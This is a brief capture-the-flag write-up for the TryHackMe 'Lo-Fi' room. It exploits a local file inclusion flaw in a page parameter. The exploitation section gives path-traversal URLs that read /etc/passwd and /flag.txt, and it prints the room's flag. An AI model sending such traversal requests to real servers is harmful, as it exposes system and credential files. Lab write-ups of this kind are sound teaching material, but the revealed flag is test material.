📚 [TryHackMe Lo-Fi](https://tryhackme.com/room/lofi)

> find the flag in the root of the filesystem.

The brief states "LFI Path Traversal", so that must be the flaw to exploit.


## recon

The homepage shows these links:

````
<ul>
  <li><a href="/?page=relax.php">Relax</a></li>
  <li><a href="/?page=sleep.php">Sleep</a></li>
  <li><a href="/?page=chill.php">Chill</a></li>    
  <li><a href="/?page=coffee.php">Coffee</a></li>
  <li><a href="/?page=vibe.php">Vibe</a></li>
  <li><a href="/?page=game.php">Game</a></li>
</ul>
````


## exploiting

Given the brief, let's try a LFI. I don't know what CWD is, so let's go up a lot:

````
http://10.64.186.26/?page=../../../../../../../../etc/passwd
````

It works.

Since the brief mention "the flag in the root", let's go for it:

````
http://10.64.186.26/?page=../../../../../../../../flag.txt
````

The flag is: `flag{e4478e0eab69bd642b8238765dcb7d18}`
